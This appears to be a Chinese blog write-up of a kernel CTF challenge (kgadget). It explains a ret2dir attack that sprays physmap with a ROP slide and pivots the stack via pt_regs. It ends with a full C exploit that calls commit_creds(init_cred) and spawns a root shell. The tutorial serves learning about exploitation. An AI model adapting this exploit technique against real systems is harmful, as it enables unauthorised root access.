+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/kgadget/sections/.text</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_19-40-02.png"
+                      alt="nipaste_2023-11-22_19-40-0"
+                ></p>
+<p>​	同时，启动脚本中没有开 kalsr 保护。</p>
+<p><strong>漏洞点</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_19-39-26.png"
+                      alt="nipaste_2023-11-22_19-39-2"
+                ></p>
+<p>​	kgadget.ko 没有实现任何功能，单纯给了一个可以控制函数指针，劫持执行流。从反编译不明显看出调用情况，再来看看汇编代码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_19-44-11.png"
+                      alt="nipaste_2023-11-22_19-44-1"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_19-44-35.png"
+                      alt="nipaste_2023-11-22_19-44-3"
+                ></p>
+<p>​	可以发现上面把 param 也就是第三个参数赋给了 rbx，下面又通过一个 call 来调用 rbx，光这样可能还是不够清楚（内心ps：又不是 call rbx），没事主打的就是一个细节，再来看看下面的动调过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-26-17.png"
+                      alt="nipaste_2023-11-22_15-26-1"
+                ></p>
+<p>​	从上面这里进入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-26-41.png"
+                      alt="nipaste_2023-11-22_15-26-4"
+                ></p>
+<p>​	到这里，执行一个跳转继续 call，在 si 进入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-27-25.png"
+                      alt="nipaste_2023-11-22_15-27-2"
+                ></p>
+<p>​	第三步就可以看到它的真面目了，<strong>字打错了应该是跳转（已经学晕了）</strong>。</p>
+<p><strong>接下来就是漏洞利用过程了，老样子我还是会逐行解释exp构成</strong></p>
+<p><strong>step 1</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] save userspace status&quot;</span>);</span><br><span class="line">    save_status(); <span class="comment">//store information</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR); <span class="comment">//open file</span></span><br><span class="line">    <span class="keyword">if</span>(dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] can&#x27;t open /dev/kgadget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>​	第一步还是保存用户态信息，然后打开文件，要注意的是与强网 core 不同的是，这里要打开的文件是在 &#x2F;dev 文件中的，这个文件夹是一个设备文件夹，又由于 kgadget 这里是作为设备出现的，所以在 dev 文件下可以找到。</p>
+<p><strong>step 2</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ROPchain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; (page_size/<span class="number">8</span> - <span class="number">0x30</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; (page_size/<span class="number">8</span> - <span class="number">0x10</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = pop_rdi_ret;</span><br><span class="line">    rop[i++] = init_cred;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_root_privilege;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    ROPchain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>​	这一步其实就是 kgadget 的核心内容，同时也是执行流的最后一步，从源代码可以粗略分析看出，在申请了一页大小的空间后（这里叫做page）即 physmap_spray_arr[0]，我们通过 ROPchain 函数向这个page中写入了大量的 gadget。</p>
+<p>​	<strong>而这个 gadget 大致是由三部分组成的</strong>：</p>
+<ol>
+<li>add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</li>
+<li>ret</li>
+<li>最终提权 rop</li>
+</ol>
+<p>​       可以发现前两个比较有意思，不是 add rsp，就是ret，他们其实是都是<strong>实现一个目标，实现将 rsp 向高地址增长，那么最后这个rsp就会定位到提权 rop 了，从而完成利用。</strong></p>
+<p>​	有个形象的说法，可以把这种 rop 链看做是滑梯（slide），最后总能滑到我们的payload。</p>
+<p><strong>注意事项：</strong></p>
+<p>​	这里有一个非常重要的事情，为什么我们不直接把后面的最终提权 ROP 直接放到 page 最前面呢，何必放到最后才执行呢？这里这样做，其实与我们第四步有关系，其实就是利用 pt_regs，关于这个答案后面我会进行说明。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-18-50.png"
+                      alt="nipaste_2023-11-22_20-18-5"
+                ></p>
+<p>​	上图也是将 mmap 出来的空间进行查看，可以看到我们的 gadget 已经写入到了一个 page 中，可是光有这一个 page 可不太够用，所以我们这里在申请出来足够多的空间，且每一个page的内容都是相同的，来增加命中率。</p>
+<p><strong>step 3</strong></p>
+<p>​	紧接着上面的代码</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!physmap_spray_arr[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] ERROR TO MMAP MEMMORY&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(physmap_spray_arr[i],physmap_spray_arr[<span class="number">0</span>],page_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>​	这里申请了 15000 个page，且让每一个page都有我们的 payload。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-28-33.png"
+                      alt="nipaste_2023-11-22_20-28-3"
+                ></p>
+<p>​	我们随机看了几处地方，可以看到，大部分位置都有我们mmap喷射出来的页面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-34-11.png"
+                      alt="nipaste_2023-11-22_20-34-1"
+                ></p>
+<p>​	这里可以看到，rsp 已经指向了我们的page，开始进行 slide 了。</p>
+<p><strong>step 4</strong></p>
+<p>​	在 step 3时，你可能观察完图后会发现，程序什么时候已经栈迁移了呢，没事这就是这一步达成目标，注意我们这里是按 exp 顺序进行分步骤讲解，实际上的 step 3 是执行流最后一步，而 step 4 是它的前一步。</p>
+<p>​	可以通过下面的这个板子来定位对应寄存器在栈中保存的位置。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">	<span class="string">&quot;mov r15, 0x1111111111;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r14, 0x2222222222;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r13, 0x3333333333;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r12, 0x4444444444;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rbp, 0x5555555555;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rbx, 0x6666666666;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r11, 0x7777777777;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r10, 0x8888888888;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r9,  0x9999999999;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov r8,  0xaaaaaaaaaa;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rdi, fd_seq;&quot;</span></span><br><span class="line">	<span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-24-32.png"
+                      alt="nipaste_2023-11-22_15-24-3"
+                ></p>
+<p>​	前面说过关于 pt_regs 的利用，上图为进入前的栈图。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-30-12.png"
+                      alt="nipaste_2023-11-22_15-30-1"
+                ></p>
+<p>​	可以发现程序在这里对栈中的数据进行了清空，而这些位置恰恰是我们要前面通过寄存器设置在栈里的值，别急，出题人友善的给我们留了两个寄存器就是 r8 和 r9,所以我们就可以通过这两个寄存器来设置 gadget 完成利用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-35-55.png"
+                      alt="nipaste_2023-11-22_15-35-5"
+                ></p>
+<p>​	从上图可以发现最后只留下了 r8 和 r9 两个寄存器中的值。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-48-33.png"
+                      alt="nipaste_2023-11-22_20-48-3"
+                ></p>
+<p>​	这里我们将 r9 和 r8 分别设置为了 pop rsp，和 add rsp,0xa0，原因如下：	</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-50-44.png"
+                      alt="nipaste_2023-11-22_20-50-4"
+                ></p>
+<p>​	将 rbx 设置为这个 gadget 的值，就可以跳转到这里，最后执行 ret 时刚好就定位到 r9 那里，然后 pop rsp，即将 r8 的值作为新的 rsp，这样就实现了栈迁移，r8的值则是我们早早已经在里面设置了上千个 gadget 的 page 的地址，至此最终就可以滑向我们最终的提权 rop 了。 </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-58-07.png"
+                      alt="nipaste_2023-11-22_20-58-0"
+                ></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] successful save status&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_privilege</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] back from kernelspace&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] SUCCESSFUL GET ROOT by henry!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]FAIL TO GET ROOT&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81bb99af</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff8103ba65</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ROPchain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; (page_size/<span class="number">8</span> - <span class="number">0x30</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; (page_size/<span class="number">8</span> - <span class="number">0x10</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = pop_rdi_ret;</span><br><span class="line">    rop[i++] = init_cred;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_root_privilege;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> direct_mapping_area;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>]; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] save userspace status&quot;</span>);</span><br><span class="line">    save_status(); <span class="comment">//store information</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR); <span class="comment">//open file</span></span><br><span class="line">    <span class="keyword">if</span>(dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] can&#x27;t open /dev/kgadget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    ROPchain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] ERROR TO MMAP MEMMORY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i],physmap_spray_arr[<span class="number">0</span>],page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] begin to ROPgadget slide&quot;</span>);</span><br><span class="line">    direct_mapping_area = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  direct_mapping_area;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, direct_mapping_area;&quot;</span> <span class="comment">// param &lt;==&gt; call rbx</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1BF52;&quot;</span>             <span class="comment">// cmd == 0x1BF52</span></span><br><span class="line">        <span class="string">&quot;mov rdi, dev_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>​	最后提权那里那个 swapgs gadget 找的方法非常新颖，暂时不清楚是怎么找到的。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ret2dir &amp; physmap spray</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2023-11-23 14:42:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-24 14:49:05
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2023/11/23/ret2dir/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/kernel/">#kernel</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/11/23/hello-world/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
